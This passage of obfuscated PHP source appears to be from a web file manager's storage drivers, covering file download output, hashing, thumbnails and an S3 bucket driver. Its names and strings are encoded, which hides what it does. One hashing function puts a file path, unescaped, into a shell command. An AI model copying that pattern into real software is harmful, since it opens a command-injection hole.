$_SERVER[ëæªã÷]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $÷ﬂ°È∫∑[99]) { return !0; } return $GLOBALS[$÷ﬂ°È∫∑[6]][$÷ﬂ°È∫∑[100]][$÷ﬂ°È∫∑[101]]; } public function isFileOutServer() { $∏ÃöÁ∞— =& $_SERVER[ëæªã÷]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $∏ÃöÁ∞—[99]) { return !0; } return $GLOBALS[$∏ÃöÁ∞—[6]][$∏ÃöÁ∞—[100]][$∏ÃöÁ∞—[102]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ﬂ¿…πö˙) { $ª˚∏‰î¶ =& $_SERVER[ëæªã÷]; if (!$this->isCdnHost()) { return $ﬂ¿…πö˙; } return str_replace(trim(get_url_root($ﬂ¿…πö˙), $ª˚∏‰î¶[8]), trim($this->cdnHost, $ª˚∏‰î¶[8]), $ﬂ¿…πö˙); } public function uploadLink($äÃ¨⁄§µ, $û¬¢˙Ùœ = 0) { $ÎÕÖÆ≈Ë =& $_SERVER[ëæªã÷]; if ($this->isUploadServer()) { return; } $õ’•£Åø = $this->getType(); if (!in_array($õ’•£Åø, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ºÂÅ›ëõ = 1024 * 1024 * 10; $ñö∂‘ûΩ = $û¬¢˙Ùœ <= $ºÂÅ›ëõ ? $ÎÕÖÆ≈Ë[103] : $ÎÕÖÆ≈Ë[104]; $áÒ˛æ˘´ = (!$û¬¢˙Ùœ ? 1 : ceil($û¬¢˙Ùœ / pow(1024, 3))) * 3600 * 4; $¢…˚Ç˛— = $this->{$ñö∂‘ûΩ}($äÃ¨⁄§µ, $áÒ˛æ˘´); if ($¢…˚Ç˛—) { $¢…˚Ç˛—[$ÎÕÖÆ≈Ë[105]] = $äÃ¨⁄§µ; $¢…˚Ç˛—[$ÎÕÖÆ≈Ë[106]] = $õ’•£Åø; } return $¢…˚Ç˛—; } public function uploadFormData($“ü∏π›ç, $≤ÁìÎ∆√ = 3600) { } public function multiUploadFormData($€Â∞É†µ, $‘°ÉÕæ¥ = 3600) { } public function download($Ñ´Ωœ◊ì, $⁄˛˚ú¯Ù) { } public function ext($®üÕßÍ¯) { $∂‘€ÆÄ¶ =& $_SERVER[ëæªã÷]; if (strpos($®üÕßÍ¯, $∂‘€ÆÄ¶[8]) === -1) { $†—Ì“œÅ = $®üÕßÍ¯; } else { $†—Ì“œÅ = $this->pathThis($®üÕßÍ¯); } $£””·÷˜ = $∂‘€ÆÄ¶[12]; if (strstr($†—Ì“œÅ, $∂‘€ÆÄ¶[10])) { $£””·÷˜ = substr($†—Ì“œÅ, strrpos($†—Ì“œÅ, $∂‘€ÆÄ¶[10]) + 1); $£””·÷˜ = strtolower($£””·÷˜); } if (strlen($£””·÷˜) > 3 && preg_match($∂‘€ÆÄ¶[107], $£””·÷˜, $˜Ú¯›ƒê)) { $£””·÷˜ = $∂‘€ÆÄ¶[12]; } return $£””·÷˜; } public function pathThis($äù√œ¥¿) { $ãÌ´ßòÌ =& $_SERVER[ëæªã÷]; $äù√œ¥¿ = str_replace($ãÌ´ßòÌ[108], $ãÌ´ßòÌ[8], rtrim($äù√œ¥¿, $ãÌ´ßòÌ[8])); $øÕÔë◊ë = strrpos($äù√œ¥¿, $ãÌ´ßòÌ[8]); if ($øÕÔë◊ë === !1) { return $äù√œ¥¿; } return substr($äù√œ¥¿, $øÕÔë◊ë + 1); } public function pathFather($Ñ—Ï≤±ˆ) { $≈«ú‰ñŒ =& $_SERVER[ëæªã÷]; $Ñ—Ï≤±ˆ = str_replace($≈«ú‰ñŒ[108], $≈«ú‰ñŒ[8], rtrim($Ñ—Ï≤±ˆ, $≈«ú‰ñŒ[8])); $ˆü÷ÔÚÇ = strrpos($Ñ—Ï≤±ˆ, $≈«ú‰ñŒ[8]); if ($ˆü÷ÔÚÇ === !1) { return $≈«ú‰ñŒ[12]; } return substr($Ñ—Ï≤±ˆ, 0, $ˆü÷ÔÚÇ + 1); } public function hashSimple($ƒÉúº´Õ) { $πåíÓ´≈ =& $_SERVER[ëæªã÷]; if (!$ƒÉúº´Õ) { return md5($πåíÓ´≈[12]); } $Ùÿ§Ïø≠ = $this->size($ƒÉúº´Õ); $Ù⁄˚åù˙ = 200; $·ñ¯©Úƒ = 50; if ($Ùÿ§Ïø≠ <= $Ù⁄˚åù˙ * $·ñ¯©Úƒ) { return $this->hashMd5($ƒÉúº´Õ) . $Ùÿ§Ïø≠; } $ì∏—Ä°∆ = intval($Ùÿ§Ïø≠ / $·ñ¯©Úƒ); $µÄŒÃÙﬂ = $πåíÓ´≈[12]; for ($ÔøÊ—öﬁ = 0; $ÔøÊ—öﬁ < $·ñ¯©Úƒ; $ÔøÊ—öﬁ++) { $µÄŒÃÙﬂ .= $this->fileSubstr($ƒÉúº´Õ, $ì∏—Ä°∆ * $ÔøÊ—öﬁ, $Ù⁄˚åù˙); } $µÄŒÃÙﬂ .= $this->fileSubstr($ƒÉúº´Õ, $Ùÿ§Ïø≠ - $Ù⁄˚åù˙, $Ù⁄˚åù˙); return md5($µÄŒÃÙﬂ) . $Ùÿ§Ïø≠; } public static $md5Cache = array(); public function hashMd5($ı¿ŸÒì») { if (!$ı¿ŸÒì») { return md5($_SERVER[ëæªã÷][12]); } $ı¿ŸÒì» = $this->iconvSystem($ı¿ŸÒì»); if (isset(self::$md5Cache[$ı¿ŸÒì»])) { return self::$md5Cache[$ı¿ŸÒì»]; } self::$md5Cache[$ı¿ŸÒì»] = $this->hashMd5Shell($ı¿ŸÒì»); if (!self::$md5Cache[$ı¿ŸÒì»]) { self::$md5Cache[$ı¿ŸÒì»] = @md5_file($ı¿ŸÒì»); } return self::$md5Cache[$ı¿ŸÒì»]; } private function hashMd5Shell($É“«∑¡Å) { $Û¥¥€¬ƒ =& $_SERVER[ëæªã÷]; if (!$É“«∑¡Å) { return md5($Û¥¥€¬ƒ[12]); } if (!function_exists($Û¥¥€¬ƒ[109])) { return !1; } $€≤ÅâŸı = array($Û¥¥€¬ƒ[110], $Û¥¥€¬ƒ[111]); $ô‹Ã⁄ù = Cache::get($Û¥¥€¬ƒ[112]); if (!$ô‹Ã⁄ù) { $Â⁄ÕÂ˙’ = BASIC_PATH . $Û¥¥€¬ƒ[113]; $∆ò‹Ûπ˙ = md5_file($Â⁄ÕÂ˙’); $ô‹Ã⁄ù = $Û¥¥€¬ƒ[114]; foreach ($€≤ÅâŸı as $∆æ∑Îƒ«) { $ÃêÆ›÷è = shell_exec($∆æ∑Îƒ« . "\x20\x22{$Â⁄ÕÂ˙’}\x22"); if ($ÃêÆ›÷è && substr(trim($ÃêÆ›÷è), 0, 32) == $∆ò‹Ûπ˙) { $ô‹Ã⁄ù = $∆æ∑Îƒ«; break; } } Cache::set($Û¥¥€¬ƒ[112], $ô‹Ã⁄ù, 3600); } if ($ô‹Ã⁄ù == $Û¥¥€¬ƒ[114]) { return !1; } $ÃêÆ›÷è = shell_exec($ô‹Ã⁄ù . "\x20\42{$É“«∑¡Å}\x22"); $ÃêÆ›÷è = str_replace($Û¥¥€¬ƒ[115], $Û¥¥€¬ƒ[12], $ÃêÆ›÷è); return substr($ÃêÆ›÷è, 0, 32); } public function link($Êù€‚†ú) { return $Êù€‚†ú; } public function fileOut($‘¥“íÚÅ, $“¸Ù≤¶Í = false, $¸ﬂÅÈØò = false, $ÆÒúøÑ´ = '') { $◊ò™å◊ó =& $_SERVER[ëæªã÷]; $this->cacheMethod(null, null); if (!$‘¥“íÚÅ || !$this->exist($‘¥“íÚÅ)) { show_json(LNG($◊ò™å◊ó[116]), !1, $¸ﬂÅÈØò); } $˝õ”ØÇ˘ = $this->getType() == $◊ò™å◊ó[117]; $ÂëÅ¸∏ø = $GLOBALS[$◊ò™å◊ó[6]][$◊ò™å◊ó[100]][$◊ò™å◊ó[118]][$◊ò™å◊ó[119]]; $ü¯√åÅ› = (double) $GLOBALS[$◊ò™å◊ó[6]][$◊ò™å◊ó[100]][$◊ò™å◊ó[118]][$◊ò™å◊ó[120]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $âﬂ˚∞Ó¬ = $this->infoFull($‘¥“íÚÅ); $ÆùÎË”‹ = $âﬂ˚∞Ó¬[$◊ò™å◊ó[90]]; $à˛ÎÍ«ô = gmdate($◊ò™å◊ó[121], $âﬂ˚∞Ó¬[$◊ò™å◊ó[96]]); $ÂûÕ™∫ù = $¸ﬂÅÈØò ? $¸ﬂÅÈØò : $this->iconvApp($âﬂ˚∞Ó¬[$◊ò™å◊ó[32]]); $‚Ñí©ºÆ = 0; $ŸÍÁ≠©ﬁ = $ÆùÎË”‹ - 1; $ËÌµ˜•í = $this->ext($ÂûÕ™∫ù); if (in_array($ËÌµ˜•í, array($◊ò™å◊ó[122], $◊ò™å◊ó[123], $◊ò™å◊ó[124], $◊ò™å◊ó[125]))) { $ËÌµ˜•í = $◊ò™å◊ó[126]; } if (!$ÆÒúøÑ´) { $ÆÒúøÑ´ = md5($à˛ÎÍ«ô . $this->hashSimple($‘¥“íÚÅ)); } $ÆÒúøÑ´ = $◊ò™å◊ó[127] . $ÆÒúøÑ´ . $◊ò™å◊ó[127]; $ØëÏ‡¨Ù = get_file_mime($ËÌµ˜•í); if ($“¸Ù≤¶Í === !1 && !mime_support($ØëÏ‡¨Ù)) { $“¸Ù≤¶Í = !0; $ØëÏ‡¨Ù = $◊ò™å◊ó[128]; } header($◊ò™å◊ó[129]); header($◊ò™å◊ó[130] . $ØëÏ‡¨Ù); $•–„®ıö = rawurlencode($ÂûÕ™∫ù); $•–„®ıö = $◊ò™å◊ó[127] . $•–„®ıö . $◊ò™å◊ó[131] . $•–„®ıö; if ($“¸Ù≤¶Í) { header($◊ò™å◊ó[132]); header($◊ò™å◊ó[133] . $•–„®ıö); } else { } header($◊ò™å◊ó[134] . gmdate($◊ò™å◊ó[121], time() + 3600 * 24 * 30) . $◊ò™å◊ó[135]); header($◊ò™å◊ó[136]); header($◊ò™å◊ó[137]); header($◊ò™å◊ó[138]); if (isset($_SERVER[$◊ò™å◊ó[139]]) && strtotime($_SERVER[$◊ò™å◊ó[139]]) == $âﬂ˚∞Ó¬[$◊ò™å◊ó[96]]) { header($◊ò™å◊ó[140], !0, 304); die; } if (isset($_SERVER[$◊ò™å◊ó[141]]) && $_SERVER[$◊ò™å◊ó[141]] == $ÆÒúøÑ´) { header($◊ò™å◊ó[142] . $ÆÒúøÑ´, !0, 304); die; } header($◊ò™å◊ó[142] . $ÆÒúøÑ´); header($◊ò™å◊ó[143] . $à˛ÎÍ«ô . $◊ò™å◊ó[135]); header($◊ò™å◊ó[144] . $ÂûÕ™∫ù); header($◊ò™å◊ó[145]); header($◊ò™å◊ó[146] . $ÆùÎË”‹); header($◊ò™å◊ó[147]); if (!$“¸Ù≤¶Í && $ËÌµ˜•í == $◊ò™å◊ó[148]) { if ($ÆùÎË”‹ > 1024 * 1024 * 5) { die; } $ã¢º„ùë = $this->getContent($‘¥“íÚÅ); $ã¢º„ùë = Html::clearSVG($ã¢º„ùë); header($◊ò™å◊ó[149] . strlen($ã¢º„ùë)); echo $ã¢º„ùë; die; } $êãî»†ƒ = strtolower($_SERVER[$◊ò™å◊ó[150]]); if ($˝õ”ØÇ˘ && $êãî»†ƒ && $ÂëÅ¸∏ø) { if (strstr($êãî»†ƒ, $◊ò™å◊ó[151])) { header($◊ò™å◊ó[152] . $‘¥“íÚÅ); } else { if (strstr($êãî»†ƒ, $◊ò™å◊ó[153])) { header($◊ò™å◊ó[154] . $‘¥“íÚÅ); } else { if (strstr($êãî»†ƒ, $◊ò™å◊ó[155])) { header($◊ò™å◊ó[156] . $‘¥“íÚÅ); } } } if ($ü¯√åÅ›) { header($◊ò™å◊ó[157] . $ü¯√åÅ›); } return; } if (isset($_SERVER[$◊ò™å◊ó[158]])) { if (preg_match($◊ò™å◊ó[159], $_SERVER[$◊ò™å◊ó[158]], $¸˙üÇ™∑)) { $‚Ñí©ºÆ = intval($¸˙üÇ™∑[1]); if (!empty($¸˙üÇ™∑[2])) { $ŸÍÁ≠©ﬁ = intval($¸˙üÇ™∑[2]); } } header($◊ò™å◊ó[160]); header("\103\x6f\x6e\164\145\x6e\x74\55\x52\x61\156\x67\x65\x3a\40\142\x79\164\x65\163\x20{$‚Ñí©ºÆ}\55{$ŸÍÁ≠©ﬁ}\x2f" . $ÆùÎË”‹); } else { header($◊ò™å◊ó[161]); } header($◊ò™å◊ó[162]); $ß›˙∑∞® = !0; if ($_SERVER[$◊ò™å◊ó[163]] == $◊ò™å◊ó[164] && $ÆùÎË”‹ > 1204 * 1024 * 1024 * 2) { $ß›˙∑∞® = !1; } if ($ß›˙∑∞®) { header($◊ò™å◊ó[165] . ($ŸÍÁ≠©ﬁ - $‚Ñí©ºÆ + 1)); } if ($_SERVER[$◊ò™å◊ó[166]] == $◊ò™å◊ó[167]) { return; } $¿º∆óè˛ = 1024 * 100; $ç˙◊˛Ê = 0; if ($ü¯√åÅ›) { $ç˙◊˛Ê = intval(1000 * 1000 * ($¿º∆óè˛ / $ü¯√åÅ›)); } while ($‚Ñí©ºÆ <= $ŸÍÁ≠©ﬁ) { $§…∞Ì‘ÿ = timeFloat(); check_abort(); $’ª†µ≈˜ = $ŸÍÁ≠©ﬁ - $‚Ñí©ºÆ + 1; if ($’ª†µ≈˜ <= $¿º∆óè˛) { $¿º∆óè˛ = $’ª†µ≈˜; } echo $this->fileSubstr($‘¥“íÚÅ, $‚Ñí©ºÆ, $¿º∆óè˛); $‚Ñí©ºÆ += $¿º∆óè˛; if ($¿º∆óè˛ == $’ª†µ≈˜) { $‚Ñí©ºÆ = $ŸÍÁ≠©ﬁ + 1; } if ($ç˙◊˛Ê) { $îªÆù…’ = intval(1000 * 1000 * (timeFloat() - $§…∞Ì‘ÿ)); $∏â© …„ = $ç˙◊˛Ê - $îªÆù…’; if ($∏â© …„ > 5) { usleep($∏â© …„); } } } } public function fileOutServer($–∫êÍ•Â, $’êÙ»Úè = false, $Ã˘˙Åπ˜ = false, $°“π∆®ı = '') { $this->fileOut($–∫êÍ•Â, $’êÙ»Úè, $Ã˘˙Åπ˜, $°“π∆®ı); } public function fileOutLink($â›∂ö–ë) { header($_SERVER[ëæªã÷][168] . $â›∂ö–ë); die; } public function cacheMethod($Îƒñ…¸¥, $¸—Îƒ’ì, $â‹–ù∑≠ = null) { $≤©ë°˙ﬂ =& $_SERVER[ëæªã÷]; static $π˜≈óÁ≤ = array(); $‚¿ºÓ“ç = $¸—Îƒ’ì ? ltrim($this->getPathOuter($¸—Îƒ’ì), $≤©ë°˙ﬂ[8]) : $¸—Îƒ’ì; $Õõé«πÂ = $≤©ë°˙ﬂ[169] . $Îƒñ…¸¥ . $≤©ë°˙ﬂ[170] . rtrim($‚¿ºÓ“ç, $≤©ë°˙ﬂ[8]); if (is_null($Îƒñ…¸¥)) { $π˜≈óÁ≤ = array(); return; } if (is_null($¸—Îƒ’ì)) { unset($π˜≈óÁ≤[$Õõé«πÂ]); return; } if (!is_null($â‹–ù∑≠)) { $π˜≈óÁ≤[$Õõé«πÂ] = $â‹–ù∑≠; return; } $¶ü£Òªü = isset($π˜≈óÁ≤[$Õõé«πÂ]) ? $π˜≈óÁ≤[$Õõé«πÂ] : null; if (!is_null($¶ü£Òªü)) { return $¶ü£Òªü; } $¶ü£Òªü = $this->{$Îƒñ…¸¥}($¸—Îƒ’ì); $π˜≈óÁ≤[$Õõé«πÂ] = $¶ü£Òªü; return $¶ü£Òªü; } public function fileOutImage($¥¥î€∂ã, $§ºªñ–á = 250) { $‚•ºÄ—ï =& $_SERVER[ëæªã÷]; set_timeout(); if (substr($¥¥î€∂ã, 0, 4) == $‚•ºÄ—ï[155]) { $this->fileOutLink($¥¥î€∂ã); } $«Ë’”‹Â = $this->info($¥¥î€∂ã); $‡˘Àä∑Á = $«Ë’”‹Â[$‚•ºÄ—ï[32]]; $óÓ¸äË = !1; if (isset($GLOBALS[$‚•ºÄ—ï[171]]) && $GLOBALS[$‚•ºÄ—ï[171]][$‚•ºÄ—ï[88]] == $«Ë’”‹Â[$‚•ºÄ—ï[88]]) { $ïŸè€‰Ä = $GLOBALS[$‚•ºÄ—ï[171]][$‚•ºÄ—ï[172]]; if (!$«Ë’”‹Â[$‚•ºÄ—ï[173]]) { $«Ë’”‹Â[$‚•ºÄ—ï[173]] = $GLOBALS[$‚•ºÄ—ï[171]]; } if (isset($ïŸè€‰Ä[$‚•ºÄ—ï[174]])) { if ($ïŸè€‰Ä[$‚•ºÄ—ï[174]] <= $§ºªñ–á && $ïŸè€‰Ä[$‚•ºÄ—ï[175]] <= $§ºªñ–á) { $óÓ¸äË = !0; } } $‡˘Àä∑Á = $«Ë’”‹Â[$‚•ºÄ—ï[173]][$‚•ºÄ—ï[32]]; } if ($«Ë’”‹Â[$‚•ºÄ—ï[90]] <= 1024 * 50 || $óÓ¸äË || !function_exists($‚•ºÄ—ï[176]) || $«Ë’”‹Â[$‚•ºÄ—ï[177]] == $‚•ºÄ—ï[178]) { return $this->fileOut($¥¥î€∂ã, !1, $‡˘Àä∑Á); } if (isset($«Ë’”‹Â[$‚•ºÄ—ï[173]][$‚•ºÄ—ï[179]])) { $ÂõÒÏıç = $«Ë’”‹Â[$‚•ºÄ—ï[173]][$‚•ºÄ—ï[179]]; } else { if (isset($«Ë’”‹Â[$‚•ºÄ—ï[173]][$‚•ºÄ—ï[180]])) { $ÂõÒÏıç = $«Ë’”‹Â[$‚•ºÄ—ï[173]][$‚•ºÄ—ï[180]]; } else { $ÂõÒÏıç = md5("{$«Ë’”‹Â[$‚•ºÄ—ï[32]]}\x5f{$«Ë’”‹Â[$‚•ºÄ—ï[88]]}\x5f{$«Ë’”‹Â[$‚•ºÄ—ï[90]]}"); } } $â”ÍœÂè = "{$ÂõÒÏıç}\137{$§ºªñ–á}\56\160\x6e\147"; if (!($Ò˙éõÔù = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $‚•ºÄ—ï[181]))) { $ñè•˝ïÈ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $‚•ºÄ—ï[182]); } else { $ñè•˝ïÈ = KodIO::make($Ò˙éõÔù); } if ($Ò˙éõÔù = IO::fileNameExist($ñè•˝ïÈ, $â”ÍœÂè)) { $†§¨£ôÚ = KodIO::make($Ò˙éõÔù); return IO::fileOut($†§¨£ôÚ, !1, $‡˘Àä∑Á); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $†§¨£ôÚ = DATA_THUMB . $â”ÍœÂè; del_file($†§¨£ôÚ); if (!@file_exists($†§¨£ôÚ)) { $§¬Ñä√º = TEMP_FILES; if (!is_dir($§¬Ñä√º)) { mk_dir($§¬Ñä√º); } $á¬ÕÕü≈ = $§¬Ñä√º . $ÂõÒÏıç . $‚•ºÄ—ï[10] . $«Ë’”‹Â[$‚•ºÄ—ï[177]]; if (!@file_exists($á¬ÕÕü≈)) { $á¬ÕÕü≈ = $this->download($¥¥î€∂ã, $á¬ÕÕü≈); } ImageThumb::createThumb($á¬ÕÕü≈, $†§¨£ôÚ, $§ºªñ–á, $§ºªñ–á * 10); } if (!file_exists($†§¨£ôÚ) || filesize($†§¨£ôÚ) < 100) { return @file_exists($á¬ÕÕü≈) ? IO::fileOut($á¬ÕÕü≈) : $this->fileOut($¥¥î€∂ã); } if (!($Ú™Á§íõ = IO::move($†§¨£ôÚ, $ñè•˝ïÈ))) { return IO::fileOut($†§¨£ôÚ); } del_file($†§¨£ôÚ); IO::fileOut($Ú™Á§íõ); } public function fileOutImageServer($âÜ¡¢Ëˆ, $ÓÍêª®ı = 250) { $this->fileOutImage($âÜ¡¢Ëˆ, $ÓÍêª®ı); } public function fileNameAuto($’öÃ”œ¿, $ƒ£†í¸ó, $É–”Ïè£ = REPEAT_RENAME, $ƒƒÈï∂Ê = false) { $ÎÒûŸ”° =& $_SERVER[ëæªã÷]; $û¡Æ¯Ãƒ = $’öÃ”œ¿ === $ÎÒûŸ”°[12] ? $ƒ£†í¸ó : rtrim($’öÃ”œ¿, $ÎÒûŸ”°[8]) . $ÎÒûŸ”°[8] . $ƒ£†í¸ó; if ($É–”Ïè£ == REPEAT_REPLACE || !$this->exist($û¡Æ¯Ãƒ) || $ƒƒÈï∂Ê && $É–”Ïè£ != REPEAT_RENAME_FOLDER) { return $ƒ£†í¸ó; } if ($É–”Ïè£ == REPEAT_SKIP) { return !1; } $”°•˚≈« = $ÎÒûŸ”°[10] . get_path_ext($ƒ£†í¸ó); $”°•˚≈« = $”°•˚≈« == $ÎÒûŸ”°[10] || $ƒƒÈï∂Ê ? $ÎÒûŸ”°[12] : $”°•˚≈«; $—èùàòâ = 1; $¬É¬ÒôÀ = substr($ƒ£†í¸ó, 0, strlen($ƒ£†í¸ó) - strlen($”°•˚≈«)); $ﬂ‚˛÷Æò = $¬É¬ÒôÀ . "\50{$—èùàòâ}\x29{$”°•˚≈«}"; while ($this->exist(rtrim($’öÃ”œ¿, $ÎÒûŸ”°[8]) . $ÎÒûŸ”°[8] . $ﬂ‚˛÷Æò)) { $ﬂ‚˛÷Æò = $¬É¬ÒôÀ . "\50{$—èùàòâ}\51{$”°•˚≈«}"; $—èùàòâ++; } return $ﬂ‚˛÷Æò; } private function fileNameAutoList($£êÑœ±ﬂ, $‰ﬁÎª»‰, $Ü°·∏„Ä = false) { $êﬂ©‡—¥ =& $_SERVER[ëæªã÷]; $™î®óÌµ = $this->listPath($£êÑœ±ﬂ, !0); $™î®óÌµ = array_merge($™î®óÌµ[$êﬂ©‡—¥[87]], $™î®óÌµ[$êﬂ©‡—¥[86]]); $Î∆≈Ü…“ = array_to_keyvalue($™î®óÌµ, $êﬂ©‡—¥[12], $êﬂ©‡—¥[32]); $¡–ïÙâ = $êﬂ©‡—¥[10] . get_path_ext($‰ﬁÎª»‰); $¡–ïÙâ = $¡–ïÙâ == $êﬂ©‡—¥[10] || $Ü°·∏„Ä ? $êﬂ©‡—¥[12] : $¡–ïÙâ; $®∂–≥ª™ = substr($‰ﬁÎª»‰, 0, strlen($‰ﬁÎª»‰) - strlen($¡–ïÙâ)); $Ô˘Ô˚Üı = $®∂–≥ª™ . "\x28\x30\51{$¡–ïÙâ}"; for ($‚ ™ªïî = 1; $‚ ™ªïî <= count($Î∆≈Ü…“) + 1; $‚ ™ªïî++) { $Ô˘Ô˚Üı = $®∂–≥ª™ . "\50{$‚ ™ªïî}\51{$¡–ïÙâ}"; if (!in_array_not_case($Ô˘Ô˚Üı, $Î∆≈Ü…“)) { return $Ô˘Ô˚Üı; } } return $Ô˘Ô˚Üı; } public function listAllFiles($¯≤œ›ë–, $ÊôÙô¯‰, $⁄Ø≥–Ì• = array()) { $‡»ï¢Ú› =& $_SERVER[ëæªã÷]; if (empty($ÊôÙô¯‰)) { return array(); } $Ù£›ÁÒ⁄ = array(); $¯≤œ›ë– = trim($¯≤œ›ë–, $‡»ï¢Ú›[8]); foreach ($ÊôÙô¯‰ as $ÀÏ§®º) { $’ûÓñ¬¶ = ltrim(substr(trim($ÀÏ§®º, $‡»ï¢Ú›[8]), strlen($¯≤œ›ë–)), $‡»ï¢Ú›[8]); $Ù£›ÁÒ⁄ = array_merge($Ù£›ÁÒ⁄, $this->slicePath($’ûÓñ¬¶)); } $∞çÍ£å´ = array(); foreach (array_unique($Ù£›ÁÒ⁄) as $ÀÏ§®º) { $¯ßË™˝  = array($‡»ï¢Ú›[88] => $this->getPathOuter($‡»ï¢Ú›[8] . $¯≤œ›ë– . $‡»ï¢Ú›[8] . $ÀÏ§®º), $‡»ï¢Ú›[89] => 1, $‡»ï¢Ú›[90] => 0); if (substr($ÀÏ§®º, -1) != $‡»ï¢Ú›[8]) { $¯ßË™˝ [$‡»ï¢Ú›[89]] = 0; $Ï≤ÓÚÚ∏ = $this->getPath($¯≤œ›ë– . $‡»ï¢Ú›[8] . $ÀÏ§®º); $¯ßË™˝ [$‡»ï¢Ú›[90]] = isset($⁄Ø≥–Ì•[$Ï≤ÓÚÚ∏]) ? $⁄Ø≥–Ì•[$Ï≤ÓÚÚ∏] : $this->size($Ï≤ÓÚÚ∏); } $∞çÍ£å´[] = $¯ßË™˝ ; } return $∞çÍ£å´; } public function slicePath($£¬ÃÀ≤≠) { $·Ë‘Ù¬¬ =& $_SERVER[ëæªã÷]; $ï∞∫É‘‚ = explode($·Ë‘Ù¬¬[8], trim($£¬ÃÀ≤≠, $·Ë‘Ù¬¬[8])); $Ë•©üû• = 0; do { ++$Ë•©üû•; $óıãèóœ[] = implode($·Ë‘Ù¬¬[8], array_slice($ï∞∫É‘‚, 0, $Ë•©üû•)) . $·Ë‘Ù¬¬[8]; } while ($Ë•©üû• < count($ï∞∫É‘‚)); $óıãèóœ[count($ï∞∫É‘‚) - 1] = $£¬ÃÀ≤≠; return $óıãèóœ; } public function getHost() { $Ë‰˜“¬ö =& $_SERVER[ëæªã÷]; $Ü¬ﬂ€áâ = parse_url(trim($this->domain, $Ë‰˜“¬ö[8])); $õ¨”◊ë® = isset($Ü¬ﬂ€áâ[$Ë‰˜“¬ö[183]]) ? $Ü¬ﬂ€áâ[$Ë‰˜“¬ö[183]] : http_type(); $—œÜ∂ÜÇ = isset($Ü¬ﬂ€áâ[$Ë‰˜“¬ö[184]]) ? $Ü¬ﬂ€áâ[$Ë‰˜“¬ö[184]] : $Ü¬ﬂ€áâ[$Ë‰˜“¬ö[88]]; if (isset($Ü¬ﬂ€áâ[$Ë‰˜“¬ö[185]])) { $—œÜ∂ÜÇ .= $Ë‰˜“¬ö[4] . $Ü¬ﬂ€áâ[$Ë‰˜“¬ö[185]]; } return $õ¨”◊ë® . $Ë‰˜“¬ö[186] . $—œÜ∂ÜÇ; } public function pathEncode($ÎÇö˝ü«) { $ ó≥çÅÆ =& $_SERVER[ëæªã÷]; return str_replace($ ó≥çÅÆ[187], $ ó≥çÅÆ[8], rawurlencode($ÎÇö˝ü«)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($πèˆŒüÏ) { set_timeout(); require_once SDK_DIR . $_SERVER[ëæªã÷][188]; parent::__construct(); $this->_init($πèˆŒüÏ); } public function _init($‡¯Í†§Ú) { foreach ($‡¯Í†§Ú as $ˆÀ≈Æ˛» => $≈îıöñÊ) { if (isset($this->{$ˆÀ≈Æ˛»})) { $this->{$ˆÀ≈Æ˛»} = $≈îıöñÊ; } } $this->endpoint = $‡¯Í†§Ú[$_SERVER[ëæªã÷][189]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Íà≈ßâ = "\x76\64") { $this->signVer = $Íà≈ßâ; $this->client->setSignatureVersion($Íà≈ßâ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $∂öû’≥≤ =& $_SERVER[ëæªã÷]; $ÏÅ”Â®Ã = $this->getBucketCors(); if (!$ÏÅ”Â®Ã || !is_array($ÏÅ”Â®Ã)) { return !1; } if ($ÏÅ”Â®Ã[$∂öû’≥≤[190]] != $∂öû’≥≤[191] || $ÏÅ”Â®Ã[$∂öû’≥≤[192]] != $∂öû’≥≤[191]) { return !1; } $µãÆÃ‚ù = array_map($∂öû’≥≤[193], $ÏÅ”Â®Ã[$∂öû’≥≤[194]]); if (!is_array($µãÆÃ‚ù)) { $µãÆÃ‚ù = array(); } $à≤˝ëæÆ = array($∂öû’≥≤[195], $∂öû’≥≤[196], $∂öû’≥≤[197], $∂öû’≥≤[198], $∂öû’≥≤[199]); $ó¸Ê·–‰ = array_diff($à≤˝ëæÆ, $µãÆÃ‚ù); return empty($ó¸Ê·–‰); } public function mkfile($¢˙°ﬁ¯È, $ıÜ÷÷äñ = '', $…÷‹¶πÇ = REPEAT_RENAME) { $ëõ¬æÅ⁄ = $this->setContent($¢˙°ﬁ¯È, $ıÜ÷÷äñ); if ($ëõ¬æÅ⁄ !== !1) { return $this->getPathOuter($¢˙°ﬁ¯È); } return !1; } public function mkdir($ﬁ˚Òê¬ß, $åû˚∫õÛ = REPEAT_SKIP) { $„ò·¬·Ê =& $_SERVER[ëæªã÷]; if (empty($ﬁ˚Òê¬ß) && $ﬁ˚Òê¬ß !== $„ò·¬·Ê[200]) { return !1; } if ($this->_isFolder($ﬁ˚Òê¬ß)) { return $this->getPathOuter($ﬁ˚Òê¬ß); } $‘óÌä◊› = $this->setContent($ﬁ˚Òê¬ß, $„ò·¬·Ê[12], !0); if ($‘óÌä◊› !== !1) { return $this->getPathOuter($ﬁ˚Òê¬ß); } return !1; } public function copyFile($–ê¨—¸Ω, $ÇŒ¢‹üö, $·◊‡ô√ú = array()) { $˙Åæ•ôÚ =& $_SERVER[ëæªã÷]; $øÛƒ˛˙˘ = $this->objectMeta($–ê¨—¸Ω); if (!$øÛƒ˛˙˘) { return !1; } if ($øÛƒ˛˙˘[$˙Åæ•ôÚ[90]] <= 1024 * 1024 * 200) { $ÆÚç„Û˝ = $this->client->copyObject($this->bucket, $–ê¨—¸Ω, $this->bucket, $ÇŒ¢‹üö, $˙Åæ•ôÚ[201], $·◊‡ô√ú); } else { $ÆÚç„Û˝ = $this->client->multiCopyObject($this->bucket, $–ê¨—¸Ω, $this->bucket, $ÇŒ¢‹üö, $·◊‡ô√ú); } $ÆÚç„Û˝ = 